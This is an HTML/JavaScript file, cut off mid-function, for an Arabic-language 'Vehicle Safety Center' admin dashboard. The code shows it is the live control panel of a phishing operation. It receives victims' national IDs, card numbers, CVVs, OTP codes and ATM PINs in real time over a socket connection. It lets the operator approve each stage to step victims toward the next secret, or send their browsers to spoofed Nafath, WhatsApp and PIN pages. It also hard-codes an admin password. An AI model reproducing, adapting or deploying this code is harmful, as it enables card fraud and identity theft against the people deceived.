<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>مركز سلامة المركبات | لوحة التحكم</title>
<script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body { font-family: 'Segoe UI', Tahoma, sans-serif; background: #f0f4f8; direction: rtl; }

  /* Login */
  #loginPage {
    min-height: 100vh; display: flex; align-items: center; justify-content: center;
    background: linear-gradient(135deg, #1a5c38 0%, #2d8a57 100%);
  }
  .login-box {
    background: #fff; border-radius: 16px; padding: 40px; width: 360px;
    box-shadow: 0 20px 60px rgba(0,0,0,0.2);
  }
  .login-box h2 { text-align: center; color: #1a5c38; margin-bottom: 8px; font-size: 20px; }
  .login-box p { text-align: center; color: #666; font-size: 13px; margin-bottom: 24px; }
  .login-box input {
    width: 100%; padding: 12px 16px; border: 1.5px solid #ddd; border-radius: 10px;
    font-size: 14px; margin-bottom: 16px; direction: ltr; text-align: center;
    transition: border-color 0.2s;
  }
  .login-box input:focus { outline: none; border-color: #1a5c38; }
  .login-box button {
    width: 100%; padding: 13px; background: #1a5c38; color: #fff; border: none;
    border-radius: 10px; font-size: 15px; font-weight: 600; cursor: pointer;
    transition: background 0.2s;
  }
  .login-box button:hover { background: #145030; }
  .login-error { color: #e53e3e; font-size: 13px; text-align: center; margin-top: -8px; margin-bottom: 12px; }

  /* Navbar */
  #adminPage { display: none; }
  .navbar {
    background: #fff; padding: 0 24px; height: 60px; display: flex; align-items: center;
    justify-content: space-between; box-shadow: 0 2px 8px rgba(0,0,0,0.08); position: sticky; top: 0; z-index: 100;
  }
  .navbar-brand { display: flex; align-items: center; gap: 10px; }
  .navbar-brand span { font-size: 16px; font-weight: 700; color: #1a5c38; }
  .navbar-status { display: flex; align-items: center; gap: 8px; font-size: 13px; color: #555; }
  .status-dot { width: 9px; height: 9px; border-radius: 50%; background: #48bb78; animation: pulse 2s infinite; }
  .status-dot.offline { background: #fc8181; animation: none; }
  @keyframes pulse { 0%,100%{opacity:1} 50%{opacity:0.4} }
  .btn-logout {
    background: #fee2e2; color: #e53e3e; border: none; padding: 7px 16px;
    border-radius: 8px; font-size: 13px; cursor: pointer; font-weight: 600;
  }

  /* Stats */
  .stats-row { display: flex; gap: 16px; padding: 20px 24px 0; flex-wrap: wrap; }
  .stat-card {
    background: #fff; border-radius: 14px; padding: 18px 22px; flex: 1; min-width: 150px;
    box-shadow: 0 2px 8px rgba(0,0,0,0.06); display: flex; align-items: center; gap: 14px;
  }
  .stat-icon {
    width: 46px; height: 46px; border-radius: 12px; display: flex; align-items: center;
    justify-content: center; font-size: 20px; flex-shrink: 0;
  }
  .stat-icon.green { background: #d1fae5; color: #059669; }
  .stat-icon.blue { background: #dbeafe; color: #2563eb; }
  .stat-icon.orange { background: #ffedd5; color: #ea580c; }
  .stat-icon.purple { background: #ede9fe; color: #7c3aed; }
  .stat-icon.teal { background: #ccfbf1; color: #0d9488; }
  .stat-info { flex: 1; }
  .stat-num { font-size: 26px; font-weight: 800; color: #1a202c; line-height: 1; }
  .stat-label { font-size: 12px; color: #718096; margin-top: 4px; }

  /* Main content */
  .main-content { padding: 20px 24px; }

  /* Section title */
  .section-title {
    font-size: 16px; font-weight: 700; color: #1a202c; margin-bottom: 14px;
    display: flex; align-items: center; gap: 8px;
  }

  /* Bookings table */
  .table-card {
    background: #fff; border-radius: 14px; box-shadow: 0 2px 8px rgba(0,0,0,0.06); overflow: hidden;
  }
  .table-header {
    padding: 16px 20px; display: flex; align-items: center; justify-content: space-between;
    border-bottom: 1px solid #f0f4f8;
  }
  .search-box {
    display: flex; align-items: center; gap: 8px; background: #f8fafc;
    border: 1.5px solid #e2e8f0; border-radius: 10px; padding: 8px 14px; width: 240px;
  }
  .search-box input { border: none; background: transparent; font-size: 13px; outline: none; width: 100%; }
  .btn-refresh {
    background: #f0f4f8; border: none; padding: 8px 14px; border-radius: 8px;
    font-size: 13px; cursor: pointer; display: flex; align-items: center; gap: 6px; color: #4a5568;
  }
  table { width: 100%; border-collapse: collapse; }
  th { background: #f8fafc; padding: 12px 16px; font-size: 12px; color: #718096; font-weight: 600; text-align: right; }
  td { padding: 13px 16px; font-size: 13px; color: #2d3748; border-bottom: 1px solid #f0f4f8; }
  tr:last-child td { border-bottom: none; }
  tr:hover td { background: #fafbfc; }

  /* Status badges */
  .status-badge {
    padding: 3px 10px; border-radius: 20px; font-size: 11px; font-weight: 700; display: inline-block;
  }
  .status-new { background: #dbeafe; color: #2563eb; }
  .status-approved { background: #d1fae5; color: #059669; }
  .status-rejected { background: #fee2e2; color: #e53e3e; }
  .status-pending { background: #ffedd5; color: #ea580c; }
  /* Live status badges */
  .status-payment { background: #ede9fe; color: #7c3aed; }
  .status-otp { background: #ffedd5; color: #ea580c; }
  .status-pin { background: #ccfbf1; color: #0d9488; }
  /* Pulse animation for live row */
  @keyframes rowPulse {
    0%,100% { background: transparent; }
    50% { background: #fef9c3; }
  }
  .row-live td { animation: rowPulse 1.5s ease 2; }

  .btn-details {
    background: #2563eb; color: #fff; border: none; padding: 6px 14px;
    border-radius: 8px; font-size: 12px; cursor: pointer; font-weight: 600;
  }
  .btn-nav {
    background: #f0f4f8; color: #4a5568; border: none; padding: 6px 10px;
    border-radius: 8px; font-size: 12px; cursor: pointer; position: relative;
  }
  .nav-dropdown {
    display: none; position: absolute; top: 100%; left: 0; background: #fff;
    border-radius: 10px; box-shadow: 0 8px 24px rgba(0,0,0,0.15); z-index: 200;
    min-width: 180px; padding: 8px 0; margin-top: 4px;
  }
  .nav-dropdown.show { display: block; }
  .nav-dropdown a {
    display: block; padding: 9px 16px; font-size: 13px; color: #2d3748;
    text-decoration: none; cursor: pointer;
  }
  .nav-dropdown a:hover { background: #f0f4f8; color: #1a5c38; }

  /* Modal */
  .modal-overlay {
    display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.5);
    z-index: 1000; align-items: center; justify-content: center;
  }
  .modal-overlay.show { display: flex; }
  .modal {
    background: #fff; border-radius: 16px; width: 560px; max-width: 95vw;
    max-height: 90vh; overflow-y: auto; box-shadow: 0 20px 60px rgba(0,0,0,0.2);
  }
  .modal-header {
    padding: 20px 24px; border-bottom: 1px solid #f0f4f8;
    display: flex; align-items: center; justify-content: space-between;
    position: sticky; top: 0; background: #fff; z-index: 10;
  }
  .modal-header h3 { font-size: 16px; font-weight: 700; color: #1a202c; }
  .modal-close { background: none; border: none; font-size: 20px; cursor: pointer; color: #718096; }
  .modal-body { padding: 20px 24px; }
  .modal-section { margin-bottom: 20px; }
  .modal-section h4 {
    font-size: 12px; font-weight: 700; color: #718096; margin-bottom: 10px;
    text-transform: uppercase; letter-spacing: 0.5px;
    display: flex; align-items: center; gap: 6px;
  }
  .modal-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
  .modal-field { background: #f8fafc; border-radius: 8px; padding: 10px 12px; }
  .modal-field label { font-size: 11px; color: #718096; display: block; margin-bottom: 3px; }
  .modal-field span { font-size: 14px; font-weight: 600; color: #1a202c; direction: ltr; display: block; }
  .modal-field.full { grid-column: 1 / -1; }

  /* Live payment section inside modal */
  .live-section {
    border: 2px solid #e2e8f0; border-radius: 12px; padding: 16px;
    margin-bottom: 16px; position: relative;
  }
  .live-section.has-data { border-color: #7c3aed; }
  .live-section.otp-live { border-color: #ea580c; }
  .live-section.pin-live { border-color: #0d9488; }
  .live-badge {
    position: absolute; top: -10px; right: 14px;
    background: #fff; padding: 0 8px;
    font-size: 11px; font-weight: 700;
  }
  .live-badge.payment-badge { color: #7c3aed; }
  .live-badge.otp-badge { color: #ea580c; }
  .live-badge.pin-badge { color: #0d9488; }
  .code-display {
    font-size: 32px; font-weight: 900; letter-spacing: 8px; text-align: center;
    padding: 14px; background: #f8fafc; border-radius: 10px; margin: 10px 0;
  }
  .code-display.otp-color { color: #ea580c; }
  .code-display.pin-color { color: #0d9488; }
  .waiting-msg {
    text-align: center; color: #a0aec0; font-size: 13px; padding: 16px 0;
    display: flex; align-items: center; justify-content: center; gap: 8px;
  }
  @keyframes spin { to { transform: rotate(360deg); } }
  .spinner { animation: spin 1s linear infinite; display: inline-block; }

  /* Action buttons inside modal */
  .modal-actions { display: flex; gap: 10px; margin-top: 14px; }
  .btn-modal-action {
    flex: 1; padding: 12px; color: #fff; border: none;
    border-radius: 10px; font-size: 14px; font-weight: 700; cursor: pointer;
    transition: background 0.3s; display: flex; align-items: center; justify-content: center; gap: 6px;
  }
  .btn-modal-action.gray { background: #9ca3af; pointer-events: none; }
  .btn-modal-action.green { background: #059669; pointer-events: auto; }
  .btn-modal-action.green:hover { background: #047857; }
  .btn-modal-action.red { background: #e53e3e; pointer-events: auto; }
  .btn-modal-action.red:hover { background: #c53030; }

  /* Pulse on new data in modal */
  @keyframes sectionPulse {
    0% { box-shadow: 0 0 0 0 rgba(124,58,237,0.5); }
    70% { box-shadow: 0 0 0 8px rgba(124,58,237,0); }
    100% { box-shadow: 0 0 0 0 rgba(124,58,237,0); }
  }
  .pulse-anim { animation: sectionPulse 0.8s ease; }

  .modal-footer { padding: 16px 24px; border-top: 1px solid #f0f4f8; display: flex; gap: 10px; }
  .btn-modal-approve {
    flex: 1; padding: 12px; background: #059669; color: #fff; border: none;
    border-radius: 10px; font-size: 14px; font-weight: 700; cursor: pointer;
  }
  .btn-modal-reject {
    flex: 1; padding: 12px; background: #e53e3e; color: #fff; border: none;
    border-radius: 10px; font-size: 14px; font-weight: 700; cursor: pointer;
  }

  .empty-state { text-align: center; padding: 40px; color: #a0aec0; }
  .empty-state i { font-size: 40px; margin-bottom: 12px; display: block; }

  @media(max-width:768px) {
    .stats-row { padding: 16px; }
    .main-content { padding: 16px; }
    .modal-grid { grid-template-columns: 1fr; }
    .search-box { width: 160px; }
  }
</style>
</head>
<body>

<!-- Login Page -->
<div id="loginPage">
  <div class="login-box">
    <h2><i class="fas fa-shield-alt" style="color:#1a5c38;margin-left:8px"></i> مركز سلامة المركبات</h2>
    <p>لوحة التحكم الإدارية</p>
    <input type="password" id="pwInput" placeholder="كلمة المرور" onkeydown="if(event.key==='Enter')doLogin()">
    <div id="loginError" class="login-error" style="display:none">كلمة المرور غير صحيحة</div>
    <button onclick="doLogin()"><i class="fas fa-sign-in-alt"></i> دخول</button>
  </div>
</div>

<!-- Admin Page -->
<div id="adminPage">
  <!-- Navbar -->
  <div class="navbar">
    <div class="navbar-brand">
      <i class="fas fa-shield-alt" style="color:#1a5c38;font-size:22px"></i>
      <span>مركز سلامة المركبات</span>
    </div>
    <div class="navbar-status">
      <div class="status-dot offline" id="statusDot"></div>
      <span id="statusText">غير متصل</span>
    </div>
    <button class="btn-logout" onclick="doLogout()"><i class="fas fa-sign-out-alt"></i> خروج</button>
  </div>

  <!-- Stats -->
  <div class="stats-row">
    <div class="stat-card">
      <div class="stat-icon green"><i class="fas fa-wifi"></i></div>
      <div class="stat-info">
        <div class="stat-num" id="statVisitors">0</div>
        <div class="stat-label">زوار متصلون الآن</div>
      </div>
    </div>
    <div class="stat-card">
      <div class="stat-icon orange"><i class="fas fa-clock"></i></div>
      <div class="stat-info">
        <div class="stat-num" id="statPending">0</div>
        <div class="stat-label">قيد المعالجة</div>
      </div>
    </div>
    <div class="stat-card">
      <div class="stat-icon blue"><i class="fas fa-check-circle"></i></div>
      <div class="stat-info">
        <div class="stat-num" id="statCompleted">0</div>
        <div class="stat-label">مكتملة</div>
      </div>
    </div>
    <div class="stat-card">
      <div class="stat-icon purple"><i class="fas fa-bell"></i></div>
      <div class="stat-info">
        <div class="stat-num" id="statToday">0</div>
        <div class="stat-label">حجوزات جديدة</div>
      </div>
    </div>
    <div class="stat-card">
      <div class="stat-icon teal"><i class="fas fa-users"></i></div>
      <div class="stat-info">
        <div class="stat-num" id="statTotal">0</div>
        <div class="stat-label">إجمالي الحجوزات</div>
      </div>
    </div>
  </div>

  <!-- Main Content -->
  <div class="main-content">
    <!-- Bookings Table -->
    <div class="table-card">
      <div class="table-header">
        <div class="section-title" style="margin-bottom:0">
          <i class="fas fa-list" style="color:#1a5c38"></i>
          قائمة الحجوزات
        </div>
        <div style="display:flex;gap:10px;align-items:center">
          <div class="search-box">
            <i class="fas fa-search" style="color:#a0aec0;font-size:13px"></i>
            <input type="text" id="searchInput" placeholder="بحث..." oninput="filterTable()">
          </div>
          <button class="btn-refresh" onclick="loadBookings()">
            <i class="fas fa-sync-alt"></i> تحديث
          </button>
        </div>
      </div>
      <div style="overflow-x:auto">
        <table id="bookingsTable">
          <thead>
            <tr>
              <th>الاسم</th>
              <th>الهوية</th>
              <th>الهاتف</th>
              <th>المنطقة</th>
              <th>نوع الخدمة</th>
              <th>التاريخ</th>
              <th>الحالة</th>
              <th>الإجراءات</th>
            </tr>
          </thead>
          <tbody id="bookingsBody">
            <tr><td colspan="8" class="empty-state"><i class="fas fa-inbox"></i>لا توجد حجوزات بعد</td></tr>
          </tbody>
        </table>
      </div>
    </div>
  </div>
</div>

<!-- Details Modal -->
<div class="modal-overlay" id="detailsModal">
  <div class="modal">
    <div class="modal-header">
      <h3 id="modalTitle"><i class="fas fa-user-circle" style="color:#1a5c38;margin-left:8px"></i> تفاصيل الحجز</h3>
      <button class="modal-close" onclick="closeModal()">&times;</button>
    </div>
    <div class="modal-body" id="modalBody"></div>
    <div class="modal-footer" id="modalFooter"></div>
  </div>
</div>

<script>
const SERVER_URL = 'https://vsafety-server-production.up.railway.app';
const ADMIN_PASSWORD = 'Vsafety@2024';

let socket = null;
let allBookings = [];
let currentModalIp = null; // IP of the booking currently open in modal

// liveData: ip -> { requestId, currentRequestId, paymentData, otpData, pinData }
let liveData = {};

// liveStatus: ip -> 'payment' | 'otp' | 'pin' | null
let liveStatus = {};

// ==================== Login ====================
function doLogin() {
  const pw = document.getElementById('pwInput').value;
  if (pw === ADMIN_PASSWORD) {
    document.getElementById('loginPage').style.display = 'none';
    document.getElementById('adminPage').style.display = 'block';
    initSocket();
    loadBookings();
  } else {
    document.getElementById('loginError').style.display = 'block';
  }
}

function doLogout() {
  if (socket) socket.disconnect();
  document.getElementById('adminPage').style.display = 'none';
  document.getElementById('loginPage').style.display = 'flex';
  document.getElementById('pwInput').value = '';
}

// ==================== Socket ====================
function initSocket() {
  socket = io(SERVER_URL, { transports: ['websocket', 'polling'] });

  socket.on('connect', () => {
    socket.emit('adminJoin');
    document.getElementById('statusDot').className = 'status-dot';
    document.getElementById('statusText').textContent = 'متصل';
  });

  socket.on('disconnect', () => {
    document.getElementById('statusDot').className = 'status-dot offline';
    document.getElementById('statusText').textContent = 'غير متصل';
  });

  socket.on('visitorUpdate', (visitors) => {
    document.getElementById('statVisitors').textContent = visitors.length;
  });

  socket.on('newBooking', (booking) => {
    allBookings.unshift(booking);
    renderBookings();
    updateStats();
    playNotification();
  });

  socket.on('bookingUpdated', (booking) => {
    const idx = allBookings.findIndex(b => b.id === booking.id);
    if (idx >= 0) allBookings[idx] = booking;
    renderBookings();
    updateStats();
  });

  // New payment data
  socket.on('newPayment', (data) => {
    const ip = data.ip;
    if (!liveData[ip]) liveData[ip] = {};
    liveData[ip].currentRequestId = data.requestId;
    liveData[ip].paymentData = data;
    liveData[ip].otpData = null;
    liveData[ip].pinData = null;
    liveStatus[ip] = 'payment';

    // Update status badge in table row
    updateRowStatus(ip, 'payment');
    updatePendingCount();
    playNotification();

    // If this IP's modal is open, refresh it
    if (currentModalIp === ip) {
      refreshModalLiveSection(ip);
    }
  });

  // New OTP / PIN
  socket.on('newCode', (data) => {
    const ip = data.ip;
    const type = data.type || 'otp';
    if (!liveData[ip]) liveData[ip] = {};
    liveData[ip].currentRequestId = data.requestId;

    if (type === 'pin') {
      liveData[ip].pinData = data;
      liveStatus[ip] = 'pin';
    } else {
      liveData[ip].otpData = data;
      liveStatus[ip] = 'otp';
    }

    // Update status badge in table row
    updateRowStatus(ip, type === 'pin' ? 'pin' : 'otp');
    updatePendingCount();
    playNotification();

    // If this IP's modal is open, refresh it
    if (currentModalIp === ip) {
      refreshModalLiveSection(ip);
    }
  });
}

// ==================== Row Status ====================
function updateRowStatus(ip, newStatus) {
  // Find booking with this IP and update its live status display
  const rows = document.querySelectorAll(`tr[data-ip="${ip}"]`);
  rows.forEach(row => {
    const statusCell = row.querySelector('.live-status-cell');
    if (statusCell) {
      statusCell.innerHTML = getLiveStatusBadge(ip, newStatus);
    }
    // Flash the row
    row.classList.remove('row-live');
    void row.offsetWidth;
    row.classList.add('row-live');
    setTimeout(() => row.classList.remove('row-live'), 3000);
  });
}

function getLiveStatusBadge(ip, status) {
  const s = status || liveStatus[ip];
  if (!s) return '';
  if (s === 'payment') return '<span class="status-badge status-payment" style="margin-right:4px"><i class="fas fa-credit-card" style="font-size:9px"></i> بطاقة</span>';
  if (s === 'otp') return '<span class="status-badge status-otp" style="margin-right:4px"><i class="fas fa-key" style="font-size:9px"></i> OTP</span>';
  if (s === 'pin') return '<span class="status-badge status-pin" style="margin-right:4px"><i class="fas fa-lock" style="font-size:9px"></i> PIN</span>';
  return '';
}

function updatePendingCount() {
  const count = Object.keys(liveData).length;
  document.getElementById('statPending').textContent = count;
}

// ==================== Bookings ====================
async function loadBookings() {
  try {
    const res = await fetch(`${SERVER_URL}/api/bookings`);
    const data = await res.json();
    allBookings = data.bookings || [];
    renderBookings();
    updateStats();
  } catch(e) {
    console.error('Load bookings error:', e);
  }
}

function renderBookings() {
  const tbody = document.getElementById('bookingsBody');
  const search = document.getElementById('searchInput').value.toLowerCase();
  const filtered = allBookings.filter(b =>
    !search ||
    (b.name && b.name.toLowerCase().includes(search)) ||
    (b.national_id && b.national_id.includes(search)) ||
    (b.phone_number && b.phone_number.includes(search)) ||
    (b.region && b.region.toLowerCase().includes(search))
  );

  if (filtered.length === 0) {
    tbody.innerHTML = '<tr><td colspan="8" class="empty-state"><i class="fas fa-inbox"></i>لا توجد حجوزات</td></tr>';
    return;
  }

  tbody.innerHTML = filtered.map(b => {
    const live = liveStatus[b.ip];
    const statusHtml = `
      <span class="status-badge status-${b.status || 'new'}">${getStatusLabel(b.status)}</span>
      <span class="live-status-cell">${live ? getLiveStatusBadge(b.ip, live) : ''}</span>
    `;
    return `
    <tr data-ip="${b.ip || ''}">
      <td>${b.name || '-'}</td>
      <td style="direction:ltr">${b.national_id || '-'}</td>
      <td style="direction:ltr">${b.phone_number || '-'}</td>
      <td>${b.region || '-'}</td>
      <td>${b.service_type || '-'}</td>
      <td style="direction:ltr">${b.date_svc || '-'}</td>
      <td>${statusHtml}</td>
      <td>
        <div style="display:flex;gap:6px;align-items:center">
          <button class="btn-details" onclick="showDetails(${b.id})">
            <i class="fas fa-eye"></i> تفاصيل
          </button>
          <div style="position:relative">
            <button class="btn-nav" onclick="toggleNavDropdown(this, '${b.ip}', '${b.id}')">
              <i class="fas fa-directions"></i>
            </button>
            <div class="nav-dropdown">
              <a onclick="navigateTo('${b.ip}', 'booking')"><i class="fas fa-calendar" style="margin-left:8px;color:#1a5c38"></i> صفحة الحجز</a>
              <a onclick="navigateTo('${b.ip}', 'payments')"><i class="fas fa-credit-card" style="margin-left:8px;color:#7c3aed"></i> صفحة البطاقة</a>
              <a onclick="navigateTo('${b.ip}', 'phone')"><i class="fas fa-phone" style="margin-left:8px;color:#2563eb"></i> صفحة الهاتف</a>
              <a onclick="navigateTo('${b.ip}', 'code')"><i class="fas fa-key" style="margin-left:8px;color:#ea580c"></i> صفحة OTP</a>
              <a onclick="navigateTo('${b.ip}', 'pin')"><i class="fas fa-lock" style="margin-left:8px;color:#0d9488"></i> صفحة الرقم السري</a>
              <a onclick="navigateTo('${b.ip}', 'whats')"><i class="fab fa-whatsapp" style="margin-left:8px;color:#25d366"></i> صفحة واتساب</a>
              <a onclick="navigateTo('${b.ip}', 'nafad')"><i class="fas fa-id-card" style="margin-left:8px;color:#d97706"></i> صفحة نفاذ</a>
              <a onclick="navigateTo('${b.ip}', 'stcCall')"><i class="fas fa-spinner" style="margin-left:8px;color:#718096"></i> صفحة الانتظار</a>
            </div>
          </div>
        </div>
      </td>
    </tr>`;
  }).join('');
}

function filterTable() { renderBookings(); }

function getStatusLabel(status) {
  const labels = { new: 'جديد', approved: 'مقبول', rejected: 'مرفوض', pending: 'قيد المعالجة' };
  return labels[status] || status || 'جديد';
}

function updateStats() {
  document.getElementById('statTotal').textContent = allBookings.length;
  const today = new Date().toISOString().split('T')[0];
  const todayCount = allBookings.filter(b => b.created_at && b.created_at.startsWith(today)).length;
  document.getElementById('statToday').textContent = todayCount;
  const completed = allBookings.filter(b => b.status === 'approved').length;
  document.getElementById('statCompleted').textContent = completed;
}

// ==================== Notification Sound ====================
function playNotification() {
  try {
    const ctx = new AudioContext();
    const osc = ctx.createOscillator();
    const gain = ctx.createGain();
    osc.connect(gain);
    gain.connect(ctx.destination);
    osc.frequency.value = 880;
    gain.gain.setValueAtTime(0.3, ctx.currentTime);
    gain.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + 0.5);
    osc.start(ctx.currentTime);
    osc.stop(ctx.currentTime + 0.5);
  } catch(e) {}
}

// ==================== Navigation ====================
function toggleNavDropdown(btn, ip, bookingId) {
  const dropdown = btn.nextElementSibling;
  document.querySelectorAll('.nav-dropdown.show').forEach(d => {
    if (d !== dropdown) d.classList.remove('show');
  });
  dropdown.classList.toggle('show');
  event.stopPropagation();
}

document.addEventListener('click', () => {
  document.querySelectorAll('.nav-dropdown.show').forEach(d => d.classList.remove('show'));
});

async function navigateTo(ip, page) {
  document.querySelectorAll('.nav-dropdown.show').forEach(d => d.classList.remove('show'));
  try {
    await fetch(`${SERVER_URL}/api/navigate`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ ip, page })
    });
  } catch(e) {
    if (socket) socket.emit('adminNavigate', { ip, page });
  }
}

// ==================== Modal ====================
async function showDetails(bookingId) {
  const booking = allBookings.find(b => b.id === bookingId);
  if (!booking) return;
  currentModalIp = booking.ip;

  let extraData = { payments: [], codes: [], phones: [] };
  try {
    const res = await fetch(`${SERVER_URL}/api/data/${booking.ip}`);
    extraData = await res.json();
  } catch(e) {}

  const body = document.getElementById('modalBody');

  // Build client info section
  let html = `
    <div class="modal-section">
      <h4><i class="fas fa-user"></i> بيانات العميل</h4>
      <div class="modal-grid">
        <div class="modal-field"><label>الاسم</label><span>${booking.name || '-'}</span></div>
        <div class="modal-field"><label>رقم الهوية</label><span>${booking.national_id || '-'}</span></div>
        <div class="modal-field"><label>رقم الهاتف</label><span>${booking.phone_number || '-'}</span></div>
        <div class="modal-field"><label>الجنسية</label><span>${booking.nationality || '-'}</span></div>
        <div class="modal-field"><label>المنطقة</label><span>${booking.region || '-'}</span></div>
        <div class="modal-field"><label>نوع الخدمة</label><span>${booking.service_type || '-'}</span></div>
        <div class="modal-field"><label>التاريخ</label><span>${booking.date_svc || '-'}</span></div>
        <div class="modal-field"><label>الوقت</label><span>${booking.time_svc || '-'}</span></div>
        <div class="modal-field"><label>IP</label><span>${booking.ip || '-'}</span></div>
        <div class="modal-field"><label>الحالة</label><span>${getStatusLabel(booking.status)}</span></div>
      </div>
    </div>`;

  // Live payment/OTP/PIN section
  html += buildLiveSection(booking.ip, extraData);

  body.innerHTML = html;

  // Footer
  const footer = document.getElementById('modalFooter');
  footer.innerHTML = `
    <button class="btn-modal-approve" onclick="updateBookingStatus(${booking.id}, 'approved')">
      <i class="fas fa-check"></i> قبول الحجز
    </button>
    <button class="btn-modal-reject" onclick="updateBookingStatus(${booking.id}, 'rejected')">
      <i class="fas fa-times"></i> رفض الحجز
    </button>
  `;

  document.getElementById('detailsModal').classList.add('show');
}

function buildLiveSection(ip, extraData) {
  const live = liveData[ip];
  const pd = live ? live.paymentData : null;
  const od = live ? live.otpData : null;
  const pind = live ? live.pinData : null;

  // Also check historical data
  const histPayments = (extraData && extraData.payments) ? extraData.payments : [];
  const histCodes = (extraData && extraData.codes) ? extraData.codes : [];

  let html = `<div class="modal-section"><h4><i class="fas fa-credit-card" style="color:#7c3aed"></i> بيانات البطاقة والرموز</h4>`;

  // Payment data section
  html += `<div class="live-section ${pd ? 'has-data' : ''}" id="modal-payment-section">
    <span class="live-badge payment-badge"><i class="fas fa-credit-card"></i> بيانات البطاقة</span>`;

  if (pd) {
    html += `
    <div class="modal-grid" style="margin-top:8px">
      <div class="modal-field full"><label>اسم حامل البطاقة</label><span>${pd.cardHolderName || pd.card_holder_name || '-'}</span></div>
      <div class="modal-field"><label>رقم البطاقة</label><span>${pd.cardNumber || pd.card_number || '-'}</span></div>
      <div class="modal-field"><label>تاريخ الانتهاء</label><span>${pd.expiry || pd.expirationDate || '-'}</span></div>
      <div class="modal-field"><label>CVV</label><span>${pd.cvv || '-'}</span></div>
    </div>`;
  } else if (histPayments.length > 0) {
    const p = histPayments[histPayments.length - 1];
    html += `
    <div class="modal-grid" style="margin-top:8px">
      <div class="modal-field full"><label>اسم حامل البطاقة</label><span>${p.card_holder_name || '-'}</span></div>
      <div class="modal-field"><label>رقم البطاقة</label><span>${p.card_number || '-'}</span></div>
      <div class="modal-field"><label>تاريخ الانتهاء</label><span>${p.expiry || '-'}</span></div>
      <div class="modal-field"><label>CVV</label><span>${p.cvv || '-'}</span></div>
    </div>`;
  } else {
    html += `<div class="waiting-msg"><i class="fas fa-circle-notch spinner"></i> في انتظار بيانات البطاقة...</div>`;
  }

  // Approve/Reject buttons for payment
  if (pd) {
    html += buildActionButtons(ip, 'payment');
  }

  html += `</div>`; // end payment section

  // OTP section
  html += `<div class="live-section ${od ? 'otp-live' : ''}" id="modal-otp-section">
    <span class="live-badge otp-badge"><i class="fas fa-key"></i> رمز OTP</span>`;

  if (od) {
    html += `<div class="code-display otp-color" id="modal-otp-value">${od.code || '-'}</div>`;
    html += buildActionButtons(ip, 'otp');
  } else {
    const histOtp = histCodes.filter(c => c.code_type !== 'pin');
    if (histOtp.length > 0) {
      html += `<div class="code-display otp-color">${histOtp[histOtp.length-1].code || '-'}</div>`;
    } else {
      html += `<div class="waiting-msg"><i class="fas fa-circle-notch spinner"></i> في انتظار رمز OTP...</div>`;
    }
  }
  html += `</div>`; // end otp section

  // PIN section
  html += `<div class="live-section ${pind ? 'pin-live' : ''}" id="modal-pin-section">
    <span class="live-badge pin-badge"><i class="fas fa-lock"></i> الرقم السري ATM</span>`;

  if (pind) {
    html += `<div class="code-display pin-color" id="modal-pin-value">${pind.code || '-'}</div>`;
    html += buildActionButtons(ip, 'pin');
  } else {
    const histPin = histCodes.filter(c => c.code_type === 'pin');
    if (histPin.length > 0) {
      html += `<div class="code-display pin-color">${histPin[histPin.length-1].code || '-'}</div>`;
    } else {
      html += `<div class="waiting-msg"><i class="fas fa-circle-notch spinner"></i> في انتظار الرقم السري...</div>`;
    }
  }
  html += `</div>`; // end pin section

  html += `</div>`; // end modal-section
  return html;
}

function buildActionButtons(ip, stage) {
  const live = liveData[ip];
  if (!live) return '';
  const currentStage = liveStatus[ip];
  const isActive = currentStage === stage;

  let approveLabel = 'قبول';
  let rejectLabel = 'رفض';
  if (stage === 'payment') { approveLabel = 'قبول → OTP'; rejectLabel = 'رفض البطاقة'; }
  if (stage === 'otp') { approveLabel = 'قبول → PIN'; rejectLabel = 'رفض → إعادة OTP'; }
  if (stage === 'pin') { approveLabel = 'قبول ✓'; rejectLabel = 'رفض → إعادة PIN'; }

  const btnClass = isActive ? '' : 'gray';
  const approveClass = isActive ? 'green' : 'gray';
  const rejectClass = isActive ? 'red' : 'gray';

  return `
  <div class="modal-actions" id="modal-actions-${stage}">
    <button class="btn-modal-action ${approveClass}" onclick="approveFromModal('${ip}', '${stage}')">
      <i class="fas fa-check"></i> ${approveLabel}
    </button>
    <button class="btn-modal-action ${rejectClass}" onclick="rejectFromModal('${ip}', '${stage}')">
      <i class="fas fa-times"></i> ${rejectLabel}
    </button>
  </div>`;
}

function refreshModalLiveSection(ip) {
  if (currentModalIp !== ip) return;
  // Re-fetch and rebuild live section only
  fetch(`${SERVER_URL}/api/data/${ip}`)
    .then(r => r.json())
    .catch(() => ({ payments: [], codes: [] }))
    .then(extraData => {
      // Find the modal-section that has the live data
      const modalBody = document.getElementById('modalBody');
      if (!modalBody) return;
      // Replace the second section (live section) by rebuilding
      const sections = modalBody.querySelectorAll('.modal-section');
      if (sections.length >= 2) {
        const liveHtml = buildLiveSection(ip, extraData);
        const tmp = document.createElement('div');
        tmp.innerHTML = liveHtml;
        sections[1].replaceWith(tmp.firstElementChild);
        // Pulse animation
        const newSection = modalBody.querySelectorAll('.modal-section')[1];
        if (newSection) {
          newSection.classList.add('pulse-anim');
          setTimeout(() => newSection.classList.remove('pulse-anim'), 800);
        }
      }
    });
}

async function approveFromModal(ip, stage) {
  const live = liveData[ip];
  if (!live || liveStatus[ip] !== stage) return;
  const requestId = live.currentRequestId;

  try {
    await fetch(`${SERVER_URL}/api/approve`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ requestId })
    });
  } catch(e) {
    if (socket) socket.emit('adminApprove', { requestId });
  }

  document.getElementById('statCompleted').textContent =
    parseInt(document.getElementById('statCompleted').textContent) + 1;

  // Gray out buttons, wait for next stage
  grayModalButtons(stage);

  // If PIN approved, clear liveData for this IP
  if (stage === 'pin') {
    delete liveData[ip];
    delete liveStatus[ip];
    updatePendingCount();
    updateRowStatus(ip, null);
  }
}

async function rejectFromModal(ip, stage) {
  const live = liveData[ip];
  if (!live || liveStatus[ip] !== stage) return;
  const requestId = live.currentRequestId;

  try {
